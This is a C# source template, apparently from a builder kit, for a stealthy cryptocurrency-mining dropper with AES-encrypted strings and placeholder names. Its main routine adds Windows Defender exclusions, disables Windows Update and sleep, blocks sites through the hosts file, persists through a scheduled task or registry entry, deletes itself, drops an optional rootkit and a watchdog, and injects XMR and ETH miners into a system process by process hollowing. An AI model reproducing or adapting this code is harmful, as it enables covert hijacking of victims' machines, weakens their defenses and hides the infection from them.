using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

#if DefAssembly
[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
#endif

public partial class _rProgram_
{
    public static void Main()
    {
        try
        {
            try
            {
#if DefWDExclusions
            
                _rCommand_(_rGetString_("#SCMD"), _rGetString_("#DefenderCommands"), true);
#endif
#if DefStartDelay
                Thread.Sleep(startDelay * 1000);
#endif
#if DefDisableWindowsUpdate
                _rCommand_(_rGetString_("#SCMD"), _rGetString_("#WUPDATE"));
#endif
#if DefDisableSleep
                _rCommand_(_rGetString_("#SCMD"), _rGetString_("#POWERCFG"));
#endif
            }
            catch (Exception ex)
            {
#if DefDebug
                MessageBox.Show("MBC: " + Environment.NewLine + ex.ToString());
#endif
            }
#if DefBlockWebsites
            try
            {
                string _rhostspath_ = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), _rGetString_("#HOSTSPATH"));
                string _rhostscontent_ = File.ReadAllText(_rhostspath_);

                string[] _rdomainset_ = new string[] { DOMAINSET };
                using (StreamWriter w = File.AppendText(_rhostspath_))
                {
                    foreach (string _set_ in _rdomainset_)
                    {
                        if (!_rhostscontent_.Contains(" " + _set_))
                        {
                            w.Write(string.Format(_rGetString_("#HOSTSFORMAT"), _set_));
                        }
                    }
                }
            }
            catch (Exception ex)
            {
#if DefDebug
                MessageBox.Show("M0.5: " + Environment.NewLine + ex.ToString());
#endif
            }
#endif
            string _rbD_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#LIBSPATH"));
            string _rbD2_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#WATCHDOGPATH"));
#if DefInstall
            try
            {
                string _rplp_ = PayloadPath;    
#if DefShellcode
                string _rcmdl_ = Environment.GetCommandLineArgs()[1];
#else
                string _rcmdl_ = Application.ExecutablePath;
#endif
                if (!_rcmdl_.Equals(_rplp_, StringComparison.CurrentCultureIgnoreCase) && !(System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem && _rcmdl_.EndsWith(_rGetString_("#INSTALLPATH"), StringComparison.CurrentCultureIgnoreCase)))
                {
#if DefMinerOverwrite
                    if(File.Exists(_rplp_)){
                        _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDSTART"), _rplp_));
                        Environment.Exit(0);
                    }
#endif
#if DefRootkit
                    try
                    {
                        _rRun_(_rExtractFile_(_rGetTheResource_("#RESRKI"), "st"), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, _rGetString_("#CONHOST")), null);                  
                    }
                    catch(Exception ex){
#if DefDebug
                        MessageBox.Show("RK: " + ex.ToString());
#endif
                    }
#endif
                    _rFindWatchdog_(true);

                    try{
                        if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                        {
                            try{
                                _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#TASKSCHADD"), _rplp_));
                            }
                            catch(Exception ex){
#if DefDebug
                                MessageBox.Show("M1: " + Environment.NewLine + ex.ToString());
#endif
                                _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#REGADD"), _rplp_));
                            }
                        }else{
                            _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#REGADD"), _rplp_));
                        }
                    }
                    catch(Exception ex){
#if DefDebug
                        MessageBox.Show("M1.5: " + ex.ToString());
#endif
                    }

                    Thread.Sleep(5000);
                    Directory.CreateDirectory(Path.GetDirectoryName(_rplp_));
                    File.Copy(_rcmdl_, _rplp_, true);
                    Thread.Sleep(2000);
#if DefRunInstall
                    _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDSTART"), _rplp_));
#endif
#if DefAutoDelete
                    _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDDELETE"), _rcmdl_));
#endif
                    Environment.Exit(0);
                }
            }
            catch(Exception ex){
#if DefDebug
                MessageBox.Show("M2: " + ex.ToString());
#endif
            }
#endif

            try
            {
                try
                {
                    Directory.CreateDirectory(_rbD_);
                    Directory.CreateDirectory(_rbD2_);
#if DefWatchdog
                    if (!_rFindWatchdog_())
                    {
#if DefMemoryWatchdog
                        _rRun_(_rGetTheResource_("#RESWD"), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, _rGetString_("#CONHOST")), null);
#else
                        File.WriteAllBytes(Path.Combine(_rbD2_, _rGetString_("#WATCHDOGNAME") + ".exe"), _rGetTheResource_("#RESWD"));

                        Process.Start(new ProcessStartInfo
                        {
                            FileName = Path.Combine(_rbD2_, _rGetString_("#WATCHDOGNAME") + ".exe"),
                            WorkingDirectory = _rbD2_,
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true
                        });
#endif
                    }
#endif
#if DefXMR
                    File.WriteAllBytes(Path.Combine(_rbD_, "WR64.sys"), _rGetTheResource_("#RESWR"));
#endif
                }
                catch (Exception ex)
                {
#if DefDebug
                    MessageBox.Show("M3: " + Environment.NewLine + ex.ToString());
#endif
                }

                byte[] _rxmr_ = { };
                byte[] _reth_ = { };

                bool _rGPU_ = _rGetGPU_();

#if DefGPU
                try
                {
                    if (_rGPU_)
                    {
                        byte[] _li_ = _rGetTheResource_("#RESLIBS");

                        if (_li_.Length > 0) {
                            using (var _rarchive_ = new ZipArchive(new MemoryStream(_li_)))
                            {
                                foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries){
                                    _rentry_.ExtractToFile(Path.Combine(_rbD_, _rentry_.FullName), true);
                                }
                            }
                        }
                    }
                }
                catch(Exception ex){
#if DefDebug
                    MessageBox.Show("M6: " + Environment.NewLine + ex.ToString());
#endif
                }
#endif

                try
                {
#if DefXMR
                    _rxmr_ = _rExtractFile_(_rGetTheResource_("#RESXMR"), "mr");
#endif

#if DefETH

                    _reth_ = _rExtractFile_(_rGetTheResource_("#RESETH"), "th");
#endif

                    string _rrunningminers_ = _rGetMiners_();

                    string[][] _rminerset_ = new string[][] { MINERSET };

                    foreach (string[] _set_ in _rminerset_)
                    {
                        if (!_rrunningminers_.Contains(_rGetString_(_set_[0])) && (_set_[1] == _rGetString_("#XID") || (_set_[1] == _rGetString_("#EID") && _rGPU_)))
                        {
                            _rRun_((_set_[1] == _rGetString_("#XID") ? _rxmr_ : _reth_), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, _rGetString_(_set_[3])), _rGetString_(_set_[2]));
                        }
                    }

                }
                catch (Exception ex)
                {
#if DefDebug
                MessageBox.Show("M5: " + Environment.NewLine + ex.ToString());
#endif
                }
            }
            catch (Exception ex)
            {
#if DefDebug
                MessageBox.Show("M6: " + Environment.NewLine + ex.ToString());
#endif
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("M0: " + Environment.NewLine + ex.ToString());
#endif
        }
        Environment.Exit(0);
    }

    public static byte[] _rGetTheResource_(string _rarg1_)
    {
        var MyResource = new System.Resources.ResourceManager("#RESPARENT", Assembly.GetExecutingAssembly());
        return _rAESMethod_((byte[])MyResource.GetObject(_rarg1_));
    }

    public static string _rGetString_(string _rarg1_)
    {
        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
    }

    public static bool _rGetGPU_()
    {
        try
        {
            string _rarg7_ = "";

            var _rarg4_ = new ConnectionOptions();
            _rarg4_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg5_ = new ManagementScope(_rGetString_("#WMISCOPE"), _rarg4_);
            _rarg5_.Connect();

            var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery(_rGetString_("#GPUQUERY"))).Get();
            foreach (ManagementObject MemObj in rarg6)
            {
                _rarg7_ += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]);
            }

            return _rarg7_.IndexOf(_rGetString_("#STRNVIDIA"), StringComparison.OrdinalIgnoreCase) >= 0 || _rarg7_.IndexOf(_rGetString_("#STRAMD"), StringComparison.OrdinalIgnoreCase) >= 0;
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("KWD: " + Environment.NewLine + ex.ToString());
#endif
        }
        return false;
    }

    public static string _rGetMiners_()
    {
        string _rminers_ = "";

        var _rarg1_ = new ConnectionOptions();
        _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
        var _rarg2_ = new ManagementScope(_rGetString_("#WMISCOPE"), _rarg1_);
        _rarg2_.Connect();

        var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery(_rGetString_("#MINERQUERY"))).Get();
        foreach (ManagementObject MemObj in _rarg3_)
        {
            if (MemObj != null && MemObj["CommandLine"] != null && MemObj["CommandLine"].ToString().Contains(_rGetString_("#MINERID")))
            {
                _rminers_ += MemObj["CommandLine"].ToString();
            }
        }
        return _rminers_;
    }

    public static bool _rFindWatchdog_(bool _rkill_ = false)
    {
#if DefWatchdog
        try
        {
            foreach (Process proc in Process.GetProcessesByName(_rGetString_("#WATCHDOGNAME")))
            {
                proc.Kill();
            }

            var _rarg1_ = new ConnectionOptions();
            _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg2_ = new ManagementScope(_rGetString_("#WMISCOPE"), _rarg1_);
            _rarg2_.Connect();

            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
            foreach (ManagementObject MemObj in _rarg3_)
            {
                if (MemObj != null && MemObj["CommandLine"] != null && MemObj["CommandLine"].ToString().Contains(_rGetString_("#WATCHDOGID")))
                {
                    if(_rkill_){
                        _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDKILL"), MemObj["ProcessID"]));
                    }else{
                        return true;
                    }
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("KWD: " + Environment.NewLine + ex.ToString());
#endif
        }
#endif
        return false;
    }

    public static void _rCommand_(string _rarg1_, string _rarg2_, bool _rwait_ = false)
    {
        try
        {
            var _rproc_ = Process.Start(new ProcessStartInfo
            {
                FileName = _rarg1_,
                Arguments = _rarg2_,
                WorkingDirectory = Environment.SystemDirectory,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
            if (_rwait_)
            {
                _rproc_.WaitForExit();
            }
        }
        catch (Exception ex)
        {
#if DefDebug
                MessageBox.Show("M.C: " + Environment.NewLine + ex.ToString());
#endif
        }
    }

    public static byte[] _rExtractFile_(byte[] _rinput_, string _rcontains_)
    {
        try
        {
            using (var _rarchive_ = new ZipArchive(new MemoryStream(_rinput_)))
            {
                foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries)
                {
                    if (_rentry_.FullName.Contains(_rcontains_))
                    {
                        using (var _rstreamdata_ = _rentry_.Open())
                        {
                            using (var _rms_ = new MemoryStream())
                            {
                                _rstreamdata_.CopyTo(_rms_);
                                return _rms_.ToArray();
                            }
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
                        MessageBox.Show("RK: " + ex.ToString());
#endif
        }
        return new byte[] { };
    }

    public static void _rRun_(byte[] _rpayload_, string _rinjectionpath_, string _rarguments_)
    {
        Assembly.Load(_rGetTheResource_("#RESRPE")).GetType(_rGetString_("#RUNPETYPE")).GetMethod(_rGetString_("#RUNPEMETHOD"), BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { _rpayload_, _rinjectionpath_, _rarguments_ });
    }

    public static byte[] _rAESMethod_(byte[] _rarg1_, bool _rarg2_ = false)
    {
        var _rarg4_ = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
        var _rarg5_ = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
        var _rarg6_ = _rarg2_ ? _rarg5_.CreateEncryptor(_rarg4_.GetBytes(16), Encoding.ASCII.GetBytes("#IV")) : _rarg5_.CreateDecryptor(_rarg4_.GetBytes(16), Encoding.ASCII.GetBytes("#IV"));
        using (var _rarg7_ = new MemoryStream())
        {
            using (var _rarg8_ = new CryptoStream(_rarg7_, _rarg6_, CryptoStreamMode.Write))
            {
                _rarg8_.Write(_rarg1_, 0, _rarg1_.Length);
                _rarg8_.Close();
            }
            return _rarg7_.ToArray();
        }
    }
}